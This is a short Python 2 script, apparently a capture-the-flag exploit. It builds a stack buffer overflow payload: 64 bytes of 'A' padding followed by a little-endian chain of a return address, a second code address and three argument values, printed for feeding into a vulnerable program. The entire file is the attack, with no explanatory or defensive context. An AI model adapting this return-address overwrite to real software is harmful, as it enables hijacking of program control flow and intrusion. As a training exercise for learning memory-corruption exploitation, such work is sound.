#!/usr/bin/python
def adr_to_str16(add):
    a = hex(add + 0x1000000000000000)
    ret  = chr(int(a[16:18], 16))
    ret += chr(int(a[14:16], 16))
    ret += chr(int(a[12:14], 16))
    ret += chr(int(a[10:12], 16))
    return ret
ORI=adr_to_str16(0x080485c4)
AG2=adr_to_str16(0xabcdefff)
AG3=adr_to_str16(0x78563412)
RET=adr_to_str16(0x08048569)
AG1=adr_to_str16(0xbadbeeef)
pile=RET+ORI+AG1+AG2+AG3
pile=(64-len(pile))*"A"+pile
print pile
